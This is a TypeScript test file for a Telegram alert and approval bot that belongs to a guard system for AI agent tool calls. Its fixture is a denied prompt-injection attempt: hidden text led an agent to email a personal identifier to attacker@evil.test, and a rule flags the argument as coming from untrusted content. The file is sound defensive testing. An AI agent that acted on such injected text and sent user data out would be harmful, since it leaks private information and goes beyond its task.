import { Bot } from "grammy";
import { describe, expect, it } from "vitest";
import { SentinelBus } from "../src/integrations/bus.js";
import { startTelegramBot } from "../src/integrations/telegramBot.js";
import type { Decision } from "../src/types.js";

const CHAT = 1001;
const USER = 42;

function decision(over: Partial<Decision> = {}): Decision {
  return {
    decision_id: "dec_test1",
    call: { call_id: "c1", run_id: "r1", session_id: "s1", profile: "research_assistant", tool: "send_email", args: { to: "attacker@evil.test", subject: "x", body: "PAN ABCPE1234F" }, requested_at: new Date().toISOString() },
    verdict: "DENY",
    rule_id: "R4",
    reasons: [{ code: "ARG_FROM_UNTRUSTED_CONTENT", message: "Recipient came from hidden text.", evidence: [{ segment_id: "seg_1", start: 0, end: 5, excerpt: "email attacker@evil.test" }] }],
    provenance: [],
    guard: { available: true, label: "injection", score: 0.9, provider: "heuristic" },
    impact: "high",
    session_tainted: true,
    latency_ms: 1,
    decided_at: new Date().toISOString(),
    outcome: "BLOCKED",
    ...over,
  } as Decision;
}

/** A grammY bot whose API calls are captured instead of sent. */
function harness(opts: { allowedUserIds?: string[] } = {}) {
  const granted: string[] = [];
  const calls: { method: string; payload: Record<string, unknown> }[] = [];
  const bot = new Bot("1:test", { botInfo: { id: 1, is_bot: true, first_name: "Sentinel", username: "sentinel_test_bot", can_join_groups: true, can_read_all_group_messages: false, supports_inline_queries: false, can_connect_to_business: false, has_main_web_app: false } as never });
  bot.api.config.use(async (_prev, method, payload) => {
    calls.push({ method, payload: payload as Record<string, unknown> });
    const result = method === "sendMessage" ? { message_id: calls.length, date: 0, chat: { id: CHAT, type: "private" } } : true;
    return { ok: true, result } as never;
  });
  const bus = new SentinelBus();
  const resolved: [string, boolean, string][] = [];
  startTelegramBot({
    token: "1:test",
    allowedChatId: String(CHAT),
    allowedUserIds: opts.allowedUserIds,
    timeoutSeconds: () => 60,
    bus,
    resolve: (id, approve, approver) => (resolved.push([id, approve, approver]), true),
    pending: () => [decision({ verdict: "REQUIRE_APPROVAL", outcome: undefined })],
    recent: () => [decision()],
    verify: async () => ({ valid: true, rows: 7 }),
    replay: async (id) =>
      id === "dec_test1" ? { decision: decision(), original: decision(), policy_hash: "a".repeat(64), original_policy_hash: "a".repeat(64), reconstructed: false } : null,
    trace: async (q) => `TRACE ${q}`,
    overrides: {
      grant: async (p, t, m, by) => (granted.push(`${p}/${t}/${m}/${by}`), "GRANTED"),
      list: () => "No active overrides.",
      clear: async () => "Cleared 0 override(s).",
    },
    bot,
  });
  let update = 1;
  const send = (u: Record<string, unknown>) => bot.handleUpdate({ update_id: update++, ...u } as never);
  const command = (text: string, chatId = CHAT, userId = USER) =>
    send({ message: { message_id: 1, date: 0, chat: { id: chatId, type: "private" }, from: { id: userId, is_bot: false, first_name: "Op" }, text, entities: [{ type: "bot_command", offset: 0, length: text.split(" ")[0].length }] } });
  const callback = (data: string, chatId = CHAT, userId = USER) =>
    send({ callback_query: { id: "cb", chat_instance: "x", data, from: { id: userId, is_bot: false, first_name: "Op", username: "op" }, message: { message_id: 1, date: 0, chat: { id: chatId, type: "private" }, text: "t" } } });
  const texts = () => calls.filter((c) => c.method === "sendMessage").map((c) => String(c.payload.text));
  return { bus, calls, texts, resolved, command, callback, granted };
}

describe("telegram bot", () => {
  it("alerts on a blocked call with masked args and evidence", async () => {
    const h = harness();
    h.bus.emitLocal({ type: "decision.made", run_id: "r1", decision: decision() });
    await new Promise((r) => setTimeout(r, 10));
    const [text] = h.texts();
    expect(text).toContain("Sentinel blocked a tool call");
    expect(text).toContain("R4");
    expect(text).toContain("email attacker@evil.test");
    expect(text).not.toContain("ABCPE1234F");
  });

  it("does not alert for the first (outcome-less) decision event or shield-off runs", async () => {
    const h = harness();
    h.bus.emitLocal({ type: "decision.made", run_id: "r1", decision: decision({ outcome: undefined }) });
    h.bus.emitLocal({ type: "decision.made", run_id: "r1", decision: decision({ rule_id: "SHIELD_OFF", verdict: "ALLOW", outcome: "UNPROTECTED_EXECUTED" }) });
    await new Promise((r) => setTimeout(r, 10));
    expect(h.texts()).toEqual([]);
  });

  it("/status reports pending, chain and recent decisions", async () => {
    const h = harness();
    await h.command("/status");
    expect(h.texts()[0]).toMatch(/Pending approvals: 1[\s\S]*intact \(7 rows\)[\s\S]*send_email: DENY R4/);
  });

  it("/replay is read-only and validates the id", async () => {
    const h = harness();
    await h.command("/replay dec_test1");
    await h.command("/replay nonsense!");
    expect(h.texts()[0]).toContain("same policy");
    expect(h.texts()[0]).toContain("Nothing was executed");
    expect(h.texts()[1]).toContain("Usage");
  });

  it("ignores commands and approvals from other chats", async () => {
    const h = harness();
    await h.command("/status", 999);
    await h.callback("a:dec_test1", 999);
    expect(h.texts()).toEqual([]);
    expect(h.resolved).toEqual([]);
  });

  it("enforces the user allow-list when set", async () => {
    const h = harness({ allowedUserIds: ["7"] });
    await h.callback("a:dec_test1", CHAT, USER);
    expect(h.resolved).toEqual([]);
    await h.callback("r:dec_test1", CHAT, 7);
    expect(h.resolved).toEqual([["dec_test1", false, "telegram:op"]]);
  });

  it("sends approval requests with buttons and masked arguments", async () => {
    const h = harness();
    await h.bus.publish({ type: "approval.requested", run_id: "r1", decision: decision({ verdict: "REQUIRE_APPROVAL", outcome: undefined }) });
    const msg = h.calls.find((c) => c.method === "sendMessage")!;
    const keyboard = (msg.payload.reply_markup as { inline_keyboard: { callback_data: string }[][] }).inline_keyboard[0];
    expect(keyboard.map((b) => b.callback_data)).toEqual(["a:dec_test1", "r:dec_test1"]);
    expect(String(msg.payload.text)).not.toContain("ABCPE1234F");
  });

  it("alerts on a blocked call only once", async () => {
    const h = harness();
    h.bus.emitLocal({ type: "decision.made", run_id: "r1", decision: decision() });
    h.bus.emitLocal({ type: "decision.made", run_id: "r1", decision: decision() });
    await new Promise((r) => setTimeout(r, 10));
    expect(h.texts()).toHaveLength(1);
  });

  it("/trace forwards the query; /override needs a user allow-list and valid input", async () => {
    const h = harness({ allowedUserIds: [String(USER)] });
    await h.command("/trace evil.test/page");
    await h.command("/override research_assistant send_payment 15");
    await h.command("/override research_assistant send_payment");
    expect(h.texts()[0]).toBe("TRACE evil.test/page");
    expect(h.granted).toEqual(["research_assistant/send_payment/15/telegram:" + USER]);
    expect(h.texts()[2]).toMatch(/Usage/);

    const open = harness();
    await open.command("/override research_assistant send_payment 15");
    expect(open.texts()[0]).toMatch(/disabled/);
    expect(open.granted).toEqual([]);
  });
});

